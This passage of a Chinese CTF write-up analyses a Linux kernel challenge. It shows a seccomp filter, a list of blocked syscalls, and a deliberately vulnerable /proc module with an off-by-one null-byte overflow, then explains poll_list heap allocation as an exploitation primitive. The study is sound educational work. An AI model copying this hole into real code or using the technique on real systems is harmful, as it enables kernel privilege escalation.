class="hljs-addition">+&#123;\</span><br><span class="hljs-addition">+__SYSCALL_COUNT(__syscall_meta__##sname.syscall_nr);\</span><br><span class="hljs-addition">+return __count_sys_##sname();\</span><br><span class="hljs-addition">+&#125;\</span><br><span class="hljs-addition">+static inline long __count_sys_##sname(void)</span><br><span class="hljs-addition">+</span><br><span class="hljs-addition">+#define SYSCALL_DEFINEx(x, sname, ...)\</span><br><span class="hljs-addition">+SYSCALL_METADATA(sname, x, __VA_ARGS__)\</span><br><span class="hljs-addition">+SYSCALL_COUNT_DECLAREx(sname, x, __VA_ARGS__)\</span><br><span class="hljs-addition">+__SYSCALL_DEFINEx(x, sname, __VA_ARGS__)\</span><br><span class="hljs-addition">+SYSCALL_COUNT_FUNCx(sname, x, __VA_ARGS__)</span><br><span class="hljs-addition">+</span><br><span class="hljs-addition">+#define SYSCALL_DEFINE0(sname)\</span><br><span class="hljs-addition">+SYSCALL_COUNT_DECLARE0(sname)\</span><br><span class="hljs-addition">+__SYSCALL_DEFINE0(sname)\</span><br><span class="hljs-addition">+SYSCALL_COUNT_FUNC0(sname)</span><br> <br>.......<br><br></code></pre></td></tr></table></figure><p>着眼于该行，</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">+<span class="hljs-constructor">DEFINE_PER_CPU(<span class="hljs-params">u64</span> [NR_syscalls], <span class="hljs-params">__per_cpu_syscall_count</span>)</span>;<br></code></pre></td></tr></table></figure><p>他会为每个CPU都创建一个 <code>__per_cpu_syscall_count</code>变量用来记录系统调用的次数，具体功能可以参考该篇<a href="https://xinqiu.gitbooks.io/linux-insides-cn/content/Concepts/linux-cpu-1.html">文章</a></p><p>还记得最开始出题人所给出的 <code>README.md</code>吗，我们此时可以使用一下他来看看</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/738b4710b912c8fccc48b7f9ba039245d688214e.jpg"></p><p>可以看到其中包含了使用到的系统调用在各个CPU当中的情况，这里暗含的一点就是 <code>D3v17</code>大师给予我们的一个漏洞利用即将用到的系统调用的小提示，可以看到截至目前被使用到的系统调用共有 <code>sys_poll,sys_execve,sys_setxattr,sys_keyctl</code></p><p>若按步骤传递字符串之后效果如下：</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/2f738bd4b31c8701f87df3d2617f9e2f0708ff3f.jpg"></p><p>这里给出之前我们提到的过滤规则</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs prolog">&#123;<br><span class="hljs-string">&quot;defaultAction&quot;</span>: <span class="hljs-string">&quot;SCMP_ACT_ERRNO&quot;</span>,<br><span class="hljs-string">&quot;defaultErrnoRet&quot;</span>: <span class="hljs-number">1</span>,<br><span class="hljs-string">&quot;syscalls&quot;</span>: [<br>&#123;<br><span class="hljs-string">&quot;names&quot;</span>: [ <span class="hljs-string">&quot;_llseek&quot;</span>, <span class="hljs-string">&quot;_newselect&quot;</span>, <span class="hljs-string">&quot;accept&quot;</span>, <span class="hljs-string">&quot;accept4&quot;</span>, <span class="hljs-string">&quot;access&quot;</span>, <span class="hljs-string">&quot;add_key&quot;</span>,&lt;...&gt; ],<br><span class="hljs-string">&quot;action&quot;</span>: <span class="hljs-string">&quot;SCMP_ACT_ALLOW&quot;</span><br>&#125;,<br>&#123;<br><span class="hljs-string">&quot;names&quot;</span>: [ <span class="hljs-string">&quot;clone&quot;</span> ],<br><span class="hljs-string">&quot;action&quot;</span>: <span class="hljs-string">&quot;SCMP_ACT_ALLOW&quot;</span>,<br><span class="hljs-string">&quot;args&quot;</span>: [ &#123; <span class="hljs-string">&quot;index&quot;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&quot;value&quot;</span>: <span class="hljs-number">2114060288</span>, <span class="hljs-string">&quot;op&quot;</span>: <span class="hljs-string">&quot;SCMP_CMP_MASKED_EQ&quot;</span> &#125; ]<br>&#125;<br>]<br>&#125;<br><br></code></pre></td></tr></table></figure><p>这里有很多，是个白名单，我就也不全部贴出，下面是 <code>smallkirby</code>师傅整理出来的部分被禁止的系统调用，其中 <code>msg*</code>系列异常显眼</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">msgget<br>msgsnd<br>msgrcv<br>msgctl<br>ptrace<br>syslog<br>uselib<br>personality<br>ustat<br>sysfs<br>vhangup<br>pivot_root<br>_sysctl<br>chroot<br>acct<br>settimeofday<br>mount<br>umount2<br><span class="hljs-keyword">swapon</span><br><span class="hljs-keyword"></span><span class="hljs-keyword">swapoff</span><br><span class="hljs-keyword"></span>reboot<br>sethostname<br>setdomainname<br>iopl<br>ioperm<br>create_module<br>init_module<br>delete_module<br>get_kernel_syms<br>query_module<br>quotactl<br>nfsservctl<br>getpmsg<br>putpmsg<br>afs_syscall<br>tuxcall<br>security<br>lookup_dcookie<br><span class="hljs-keyword">clock_settime</span><br><span class="hljs-keyword"></span>vserver<br>mbind<br>set_mempolicy<br>get_mempolicy<br>mq_open<br>mq_unlink<br>mq_timedsend<br>mq_timedreceive<br>mq_notify<br>mq_getsetattr<br>kexec_load<br>request_key<br>migrate_pages<br>unshare<br><span class="hljs-keyword">move_pages</span><br><span class="hljs-keyword"></span>perf_event_open<br>fanotify_init<br>name_to_handle_at<br>open_by_handle_at<br>setns<br>process_vm_readv<br>process_vm_writev<br>kcmp<br>finit_module<br>kexec_file_load<br><span class="hljs-keyword">bpf</span><br><span class="hljs-keyword"></span>userfaultfd<br>pkey_mprotect<br>pkey_alloc<br>pkey_free<br></code></pre></td></tr></table></figure><h2 id="2-漏洞模块"><a href="#2-漏洞模块" class="headerlink" title="2.漏洞模块"></a>2.漏洞模块</h2><p>这里 <code>D3v17</code>师傅已经在博客当中给出了源码，十分贴心，接下来我们逐步来进行逆向</p><h3 id="初始化"><a href="#初始化" class="headerlink" title="初始化"></a>初始化</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">init_procfs</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    printk(KERN_INFO <span class="hljs-string">&quot;[CoRMon::Init] Initializing module...\n&quot;</span>);<br><br>    cormon = proc_create(<span class="hljs-string">&quot;cormon&quot;</span>, <span class="hljs-number">0666</span>, <span class="hljs-literal">NULL</span>, &amp;cormon_proc_ops);<br><br>    <span class="hljs-keyword">if</span> (!cormon)<br>    &#123;<br>        printk(KERN_ERR <span class="hljs-string">&quot;[CoRMon::Error] proc_create() call failed!\n&quot;</span>);<br>        <span class="hljs-keyword">return</span> -ENOMEM;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (update_filter(initial_filter))<br>        <span class="hljs-keyword">return</span> -EINVAL;<br><br>    printk(KERN_INFO <span class="hljs-string">&quot;[CoRMon::Init] Initialization complete!\n&quot;</span>);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">proc_ops</span> <span class="hljs-title">cormon_proc_ops</span> =</span> &#123;<br>    .proc_open  = cormon_proc_open,<br>    .proc_read  = seq_read,<br>    .proc_write = cormon_proc_write<br>&#125;;<br><br><span class="hljs-type">static</span> <span class="hljs-type">char</span> initial_filter[] = <span class="hljs-string">&quot;sys_execve,sys_execveat,sys_fork,sys_keyctl,sys_msgget,sys_msgrcv&quot;</span>                    <br>                                <span class="hljs-string">&quot;sys_msgsnd,sys_poll,sys_ptrace,sys_setxattr,sys_unshare&quot;</span>;<br><br><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">update_filter</span><span class="hljs-params">(<span class="hljs-type">char</span> *syscalls)</span><br>&#123;<br>    <span class="hljs-type">uint8_t</span> new_filter[NR_syscalls] = &#123; <span class="hljs-number">0</span> &#125;;<br>    <span class="hljs-type">char</span> *name;<br>    <span class="hljs-type">int</span> nr;<br><br>    <span class="hljs-keyword">while</span> ((name = strsep(&amp;syscalls, <span class="hljs-string">&quot;,&quot;</span>)) != <span class="hljs-literal">NULL</span> || syscalls != <span class="hljs-literal">NULL</span>)<br>    &#123;<br>        nr = get_syscall_nr(name);<br><br>        <span class="hljs-keyword">if</span> (nr &lt; <span class="hljs-number">0</span>)<br>        &#123;<br>            printk(KERN_ERR <span class="hljs-string">&quot;[CoRMon::Error] Invalid syscall: %s!\n&quot;</span>, name);<br>            <span class="hljs-keyword">return</span> -EINVAL;<br>        &#125;<br><br>        new_filter[nr] = <span class="hljs-number">1</span>;<br>    &#125;<br><br>    <span class="hljs-built_in">memcpy</span>(filter, new_filter, <span class="hljs-keyword">sizeof</span>(filter));<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>这里初始化部分很简单，首先创建 <code>/proc/cormon</code>进程，然后绑定了一个传入的函数表 <code>cormon_proc_ops</code>，其中具体实现我们之后细看，然后他会传入一个初始化的字符串，其中均是用 <code>,</code>隔离的系统调用名，调用我们的 <code>update_filter()</code>函数来更新一个全局过滤器 <code>filter</code>,该过滤器记录了我们使用 <code>cat /proc/cormon_rw</code>所显示的系统调用</p><h3 id="cormon-proc-open"><a href="#cormon-proc-open" class="headerlink" title="cormon_proc_open"></a>cormon_proc_open</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">cormon_proc_open</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> inode *inode, <span class="hljs-keyword">struct</span>  file *file)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> seq_open(file, &amp;cormon_seq_ops);<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">seq_operations</span> <span class="hljs-title">cormon_seq_ops</span> =</span> &#123;<br>    .start  = cormon_seq_start,<br>    .next   = cormon_seq_next,<br>    .stop   = cormon_seq_stop,<br>    .show   = cormon_seq_show<br>&#125;;<br></code></pre></td></tr></table></figure><p>Nothing special….</p><h3 id="cormon-proc-write"><a href="#cormon-proc-write" class="headerlink" title="cormon_proc_write"></a>cormon_proc_write</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">ssize_t</span> <span class="hljs-title function_">cormon_proc_write</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> file *file, <span class="hljs-type">const</span> <span class="hljs-type">char</span> __user *ubuf, <span class="hljs-type">size_t</span> count, <span class="hljs-type">loff_t</span> *ppos)</span> <br>&#123;<br>    <span class="hljs-type">loff_t</span> offset = *ppos;<br>    <span class="hljs-type">char</span> *syscalls;<br>    <span class="hljs-type">size_t</span> len;<br><br>    <span class="hljs-keyword">if</span> (offset &lt; <span class="hljs-number">0</span>)<br>        <span class="hljs-keyword">return</span> -EINVAL;<br><br>    <span class="hljs-keyword">if</span> (offset &gt;= PAGE_SIZE || !count)<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>    len = count &gt; PAGE_SIZE ? PAGE_SIZE - <span class="hljs-number">1</span> : count;<br><br>    syscalls = kmalloc(PAGE_SIZE, GFP_ATOMIC);<br>    printk(KERN_INFO <span class="hljs-string">&quot;[CoRMon::Debug] Syscalls @ %#llx\n&quot;</span>, (<span class="hljs-type">uint64_t</span>)syscalls);<br><br>    <span class="hljs-keyword">if</span> (!syscalls)<br>    &#123;<br>        printk(KERN_ERR <span class="hljs-string">&quot;[CoRMon::Error] kmalloc() call failed!\n&quot;</span>);<br>        <span class="hljs-keyword">return</span> -ENOMEM;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (copy_from_user(syscalls, ubuf, len))<br>    &#123;<br>        printk(KERN_ERR <span class="hljs-string">&quot;[CoRMon::Error] copy_from_user() call failed!\n&quot;</span>);<br>        <span class="hljs-keyword">return</span> -EFAULT;<br>    &#125;<br><br>    syscalls[len] = <span class="hljs-string">&#x27;\x00&#x27;</span>;<br><br>    <span class="hljs-keyword">if</span> (update_filter(syscalls))<br>    &#123;<br>        kfree(syscalls);<br>        <span class="hljs-keyword">return</span> -EINVAL;<br>    &#125;<br><br>    kfree(syscalls);<br><br>    <span class="hljs-keyword">return</span> count;<br>&#125;<br></code></pre></td></tr></table></figure><p>这里可以看到有一个很明显的 <code>Null Byte</code>溢出，这里大概逻辑就是将我们传入的字符串首先复制到内核空间，这个空间通过 <code>kmalloc</code>获取一个4K大小的块，然后使用 <code>update_filter</code>函数来更新咱们的系统调用显示</p><h3 id="cormon-seq-start"><a href="#cormon-seq-start" class="headerlink" title="cormon_seq_start"></a>cormon_seq_start</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">static</span> <span class="hljs-type">void</span> *<span class="hljs-title">cormon_seq_start</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> seq_file *s, <span class="hljs-type">loff_t</span> *pos)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">return</span> *pos &gt; NR_syscalls ? <span class="hljs-literal">NULL</span> : pos;<br>&#125;<br></code></pre></td></tr></table></figure><p>在 <code>seq_read()</code>函数调用时会使用</p><h3 id="cormon-seq-next"><a href="#cormon-seq-next" class="headerlink" title="cormon_seq_next"></a>cormon_seq_next</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> *<span class="hljs-title function_">cormon_seq_next</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> seq_file *s, <span class="hljs-type">void</span> *v, <span class="hljs-type">loff_t</span> *pos)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> (*pos)++ &gt; NR_syscalls ? <span class="hljs-literal">NULL</span> : pos;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="cormon-seq-stop"><a href="#cormon-seq-stop" class="headerlink" title="cormon_seq_stop"></a>cormon_seq_stop</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">cormon_seq_stop</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> seq_file *s, <span class="hljs-type">void</span> *v)</span><br>&#123;<br>    <span class="hljs-keyword">return</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="cormon-seq-show"><a href="#cormon-seq-show" class="headerlink" title="cormon_seq_show"></a>cormon_seq_show</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">cormon_seq_show</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> seq_file *s, <span class="hljs-type">void</span> *pos)</span><br>&#123;<br>    <span class="hljs-type">loff_t</span> nr = *(<span class="hljs-type">loff_t</span> *)pos;<br>    <span class="hljs-type">const</span> <span class="hljs-type">char</span> *name;<br>    <span class="hljs-type">int</span> i;<br><br>    <span class="hljs-keyword">if</span> (nr == <span class="hljs-number">0</span>)<br>    &#123;<br>        seq_putc(s, <span class="hljs-string">&#x27;\n&#x27;</span>);<br><br>        for_each_online_cpu(i)<br>            seq_printf(s, <span class="hljs-string">&quot;%9s%d&quot;</span>, <span class="hljs-string">&quot;CPU&quot;</span>, i);<br><br>        seq_printf(s, <span class="hljs-string">&quot;\tSyscall (NR)\n\n&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (filter[nr])<br>    &#123;<br>        name = get_syscall_name(nr);<br><br>        <span class="hljs-keyword">if</span> (!name)<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>        for_each_online_cpu(i)<br>            seq_printf(s, <span class="hljs-string">&quot;%10llu&quot;</span>, per_cpu(__per_cpu_syscall_count, i)[nr]);<br><br>        seq_printf(s, <span class="hljs-string">&quot;\t%s (%lld)\n&quot;</span>, name, nr);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (nr == NR_syscalls)<br>        seq_putc(s, <span class="hljs-string">&#x27;\n&#x27;</span>);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>该函数即为当我们使用 <code>cat /proc_rw/cormon</code>来显示该文件展现出的打印</p><p>而由于本题已经禁用了 <code>unshare</code> <code>msg*</code>等系统调用，所以我们平时十分常用的 <code>msg_msg</code>结构体也已经无法使用，接下来将会引入一个出题者在Google系统上使用到的一个特殊技术，那就是 <code>poll_list</code>，在这种情况下据出题人所述几乎有一个无限空间越界写的原语</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/3c6d55fbb2fb43161c6ecf4e66a4462309f7d395.jpg"></p><h1 id="0x02-poll-list基础"><a href="#0x02-poll-list基础" class="headerlink" title="0x02 poll_list基础"></a>0x02 poll_list基础</h1><p>首先查看man手册</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">DESCRIPTION<br>       poll()  performs  a  <span class="hljs-keyword">similar</span> task <span class="hljs-keyword">to</span> <span class="hljs-keyword">select</span>(<span class="hljs-number">2</span>): it waits <span class="hljs-keyword">for</span> one <span class="hljs-keyword">of</span> a <span class="hljs-keyword">set</span> <span class="hljs-keyword">of</span> file descriptors <span class="hljs-keyword">to</span> become ready <span class="hljs-keyword">to</span> <span class="hljs-keyword">perform</span> I/O.  The Linux-specific epoll(<span class="hljs-number">7</span>) API performs a <span class="hljs-keyword">similar</span> task, but offers features beyond those<br>       <span class="hljs-built_in">found</span> <span class="hljs-keyword">in</span> poll().<br><br></code></pre></td></tr></table></figure><p>该poll系统调用是用来检测一组文件描述符的活动，当我们每次调用 <code>poll()</code>系统调用时，内核空间将会分配一个 <code>poll_list</code>结构体对象</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">poll</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> pollfd *fds, <span class="hljs-type">nfds_t</span> nfds, <span class="hljs-type">int</span> timeout)</span></span>;<br></code></pre></td></tr></table></figure><p>其中传递了三个参数</p><ol><li><code>fds</code>: <code>pollfd</code>类型的一个数组</li><li><code>nfds</code>:前面的参数<code>fds</code>中条目的个数</li><li><code>timeout</code>:事件发生的毫秒数</li></ol><p>下面是相关的数据结构</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">struct</span> <span class="hljs-title class_">pollfd</span> &#123;<br><span class="hljs-type">int</span> fd;<br><span class="hljs-type">short</span> <span class="hljs-type">int</span> events;<br><span class="hljs-type">short</span> <span class="hljs-type">int</span> revents;<br>&#125;;<br><br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">poll_list</span> &#123;<br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">poll_list</span> *next;<br><span class="hljs-type">int</span> len;<br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">pollfd</span> entries[];<br>&#125;;<br></code></pre></td></tr></table></figure><p>那么我们该如何分配一个 <code>poll_list</code>对象呢，</p><p>当我们调用 <code>poll()</code>系统调用，这里会调用到 <code>do_sys_poll()</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">do_sys_poll</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> pollfd __user *ufds, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> nfds,</span><br><span class="hljs-params"><span class="hljs-keyword">struct</span> timespec64 *end_time)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">poll_wqueues</span> <span class="hljs-title">table</span>;</span><br><span class="hljs-type">int</span> err = -EFAULT, fdcount, len;<br><span class="hljs-comment">/* Allocate small arguments on the stack to save memory and be</span><br><span class="hljs-comment">   faster - use long to make sure the buffer is aligned properly</span><br><span class="hljs-comment">   on 64 bit archs to avoid unaligned access */</span><br><span class="hljs-type">long</span> stack_pps[POLL_STACK_ALLOC/<span class="hljs-keyword">sizeof</span>(<span class="hljs-type">long</span>)];<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">poll_list</span> *<span class="hljs-title">const</span> <span class="hljs-title">head</span> =</span> (<span class="hljs-keyword">struct</span> poll_list *)stack_pps;<br> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">poll_list</span> *<span class="hljs-title">walk</span> =</span> head;<br> <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> todo = nfds;<br><br><span class="hljs-keyword">if</span> (nfds &gt; rlimit(RLIMIT_NOFILE))<br><span class="hljs-keyword">return</span> -EINVAL;<br><br>len = <span class="hljs-type">min_t</span>(<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>, nfds, N_STACK_PPS);<br><span class="hljs-keyword">for</span> (;;) &#123;<br>walk-&gt;next = <span class="hljs-literal">NULL</span>;<br>walk-&gt;len = len;<br><span class="hljs-keyword">if</span> (!len)<br><span class="hljs-keyword">break</span>;<br><br><span class="hljs-keyword">if</span> (copy_from_user(walk-&gt;entries, ufds + nfds-todo,<br><span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> pollfd) * walk-&gt;len))<br><span class="hljs-keyword">goto</span> out_fds;<br><br>todo -= walk-&gt;len;<br><span class="hljs-keyword">if</span> (!todo)<br><span class="hljs-keyword">break</span>;<br><br>len = min(todo, POLLFD_PER_PAGE);<br>walk = walk-&gt;next = kmalloc(struct_size(walk, entries, len),<br>    GFP_KERNEL);<br><span class="hljs-keyword">if</span> (!walk) &#123;<br>err = -ENOMEM;<br><span class="hljs-keyword">goto</span> out_fds;<br>&#125;<br>&#125;<br><br>......<br></code></pre></td></tr></table></figure><p>代码首先是在栈空间当中创建了一个256字节大小的缓冲区，其中能存放 30个 <code>struct pollfd</code>和1个 <code>struct poll_list</code>，如果说我们所需要传入的 <code>pollfd</code>大于30个的话，那么多余的部分将会保存在内核堆上，如果我们精确计算传入的 <code>pollfd</code>个数，那么我们可以分配的范围达到 <code>kmalloc-32 ~ kmalloc-4k</code>之大，也就是说如果我们传入了540个文件描述符的化，他在内核内存空间中的分配会按照下面的分配模式</p><p><code>内核栈30个 + 内核堆510个</code></p><p>该内核堆是从 <code>kmalloc-4k</code>获取，然而如果说我们传入了超过542个文件描述符呢，它同样会开辟适当的内核堆空间进行分配，这里我们做个比方，如果说我们传入542个文件描述符，他的分配情况会如下：</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/f3d3572c11dfa9ecebdce12324d0f703918fc110.jpg"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span 